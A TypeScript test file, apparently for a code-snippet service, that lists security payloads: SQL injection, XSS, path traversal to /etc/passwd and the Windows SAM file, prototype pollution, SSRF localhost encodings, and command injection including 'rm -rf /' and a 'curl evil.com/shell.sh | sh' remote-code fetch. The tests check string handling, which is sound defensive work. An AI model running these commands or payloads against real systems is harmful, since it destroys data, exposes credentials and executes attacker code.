import { describe, it } from "node:test";
import assert from "node:assert";

describe("SQL Injection Vectors", () => {
  const sqlPayloads = [
    "'; DROP TABLE snippets; --",
    "1' OR '1'='1' --",
    '"; DELETE FROM users WHERE 1=1; --',
    "' UNION SELECT username, password FROM users --",
    "1; UPDATE snippets SET visibility = 'PUBLIC' --",
    "admin'--",
    "' OR 1=1 LIMIT 1 --",
    "`; DELETE FROM snippets; --",
    "') OR ('1'='1",
    "\x00'; DROP TABLE snippets; --",
  ];

  it("SQL payloads should contain special SQL chars", () => {
    for (const payload of sqlPayloads) {
      assert.ok(
        payload.includes("'") || payload.includes('"') || payload.includes("`") || payload.includes(";"),
        `Payload should have SQL special chars: ${payload}`
      );
    }
  });

  it("SQL payloads are non-empty strings", () => {
    for (const payload of sqlPayloads) {
      assert.strictEqual(typeof payload, "string");
      assert.ok(payload.length > 0);
    }
  });
});

describe("XSS Vectors", () => {
  const xssPayloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "<<SCRIPT>alert(1);//<</SCRIPT>",
    "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(1)';</STYLE>",
  ];

  it("XSS payloads contain HTML/script markers", () => {
    for (const payload of xssPayloads) {
      const hasAngle = payload.includes("<") || payload.includes(">");
      const hasScript = payload.toLowerCase().includes("script") || payload.toLowerCase().includes("alert");
      const hasEvent = payload.toLowerCase().includes("onerror") || payload.toLowerCase().includes("onload");
      assert.ok(hasAngle || hasScript || hasEvent, `Payload should have XSS markers: ${payload}`);
    }
  });

  it("all XSS payloads survive as string values through JSON parse", () => {
    for (const payload of xssPayloads) {
      const obj = { title: payload };
      const json = JSON.stringify(obj);
      const parsed = JSON.parse(json);
      assert.strictEqual(parsed.title, payload);
      assert.strictEqual(typeof parsed.title, "string");
    }
  });
});

describe("Path Traversal Vectors", () => {
  const traversalPayloads = [
    "../../../etc/passwd",
    "..\\..\\Windows\\System32\\config\\SAM",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "....\\....\\....\\etc\\passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
  ];

  it("all traversal payloads contain dot-dot patterns", () => {
    for (const payload of traversalPayloads) {
      let decoded: string;
      try {
        decoded = decodeURIComponent(payload);
      } catch {
        decoded = payload;
      }
      const hasPattern =
        decoded.includes("..") ||
        decoded.includes("etc/passwd") ||
        decoded.includes("Windows");
      assert.ok(hasPattern, `Should contain traversal pattern: ${payload}`);
    }
  });

  it("sanitization removes path separators", () => {
    function sanitize(name: string): string {
      return name.replace(/[<>:"/\\|?*\x00-\x1f]/g, "_");
    }
    for (const payload of traversalPayloads) {
      const sanitized = sanitize(payload);
      assert.strictEqual(sanitized.includes("/"), false, `${payload} should not contain /`);
      assert.strictEqual(sanitized.includes("\\"), false, `${payload} should not contain \\`);
    }
  });
});

describe("Null Byte Injection", () => {
  it("null bytes are detected and sanitized", () => {
    const input = "test\x00file.ts";
    const sanitized = input.replace(/\x00/g, "_");
    assert.strictEqual(sanitized, "test_file.ts");
    assert.strictEqual(sanitized.includes("\x00"), false);
  });
});

describe("Prototype Pollution Vectors", () => {
  it("__proto__ assignments don't affect Object prototype in JSON parse", () => {
    const malicious = '{"__proto__": {"isAdmin": true}}';
    JSON.parse(malicious);
    assert.strictEqual(({} as Record<string, unknown>).isAdmin, undefined);
  });

  it("constructor.prototype access is harmless in parsed JSON", () => {
    const malicious = '{"constructor": {"prototype": {"isAdmin": true}}}';
    JSON.parse(malicious);
    assert.strictEqual(({} as Record<string, unknown>).isAdmin, undefined);
  });
});

describe("Command Injection Vectors", () => {
  const cmdPayloads = [
    "$(rm -rf /)",
    "`rm -rf /`",
    "; rm -rf /",
    "| rm -rf /",
    "&& rm -rf /",
    "$(curl evil.com/shell.sh | sh)",
  ];

  it("command injection payloads survive JSON roundtrip unchanged", () => {
    for (const payload of cmdPayloads) {
      const obj = { code: payload };
      const json = JSON.stringify(obj);
      const parsed = JSON.parse(json);
      assert.strictEqual(parsed.code, payload);
    }
  });

  it("all command injection payloads contain shell metacharacters", () => {
    for (const payload of cmdPayloads) {
      assert.strictEqual(typeof payload, "string");
      assert.ok(payload.length > 0);
      const hasMeta = /[`$;|&]/.test(payload);
      assert.ok(hasMeta, `${payload} should contain shell metacharacters`);
    }
  });
});

describe("SSRF Bypass Attempts", () => {
  it("detects encoded localhost URLs", () => {
    const attempts = [
      "http://127.0.0.1",
      "http://0x7f000001",
      "http://2130706433",
      "http://0177.0.0.1",
      "http://0x7f.0x0.0x0.0x1",
    ];
    for (const url of attempts) {
      const isLocalhost = url.includes("127") || url.includes("0x7f") || url.includes("2130706433") || url.includes("0.0.1");
      assert.ok(isLocalhost, `Should be a localhost bypass attempt: ${url}`);
    }
  });

  it("detects DNS rebinding patterns", () => {
    const pattern = "1.1.1.1.nip.io";
    assert.ok(pattern.includes("nip.io"));
  });
});
